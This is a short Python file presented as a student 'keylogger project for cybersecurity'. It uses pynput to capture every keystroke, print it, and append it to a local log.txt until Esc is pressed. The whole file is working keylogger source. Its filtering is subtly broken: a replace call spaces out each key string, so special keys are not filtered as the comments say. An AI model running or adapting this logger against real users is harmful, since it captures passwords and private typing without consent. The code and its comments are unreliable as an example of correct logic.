#Keylogger project for cybersecurity by Aishik Dasgupta
# Note: Special character handling is not included in this code.
# Special keys may not be accurately represented in the log file.
import pynput
from pynput.keyboard import Key, Listener

# Initialize a count for the number of keys pressed, taking intially it as 0
count = 0
# Initialize a list to store the keys
keys = []

# This function is called when a key is pressed to record the key press()
def on_press(key):
    global keys, count

    # Add the pressed key to the keys list
    keys.append(key)
    # Increment the count of keys pressed
    count += 1
    # Print the key that was pressed
    print("{0} pressed".format(key))

    # If 10 keys have been pressed, reset the count to 0 and write the keys to a file
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# This function writes the pressed keys to a file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            # Convert the key to a string and replace empty strings with spaces for better visualization of the output
            k = str(key).replace('', ' ')
            # If the key represents a space, write a newline character
            if k.find("space") > 0:
                f.write('\n')
            # If the key does not contain "Key" in its string representation, write it to the file
            elif k.find("Key") == -1:
                f.write(k)

# This function is called when a key is released, the keypress gets recorded
def on_release(key):
    # If the Escape key is pressed, stop listening
    if key == Key.esc:
        return False

# Set up a listener for keyboard events, specifying the functions to call on press and release
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start listening for keyboard events
    listener.join()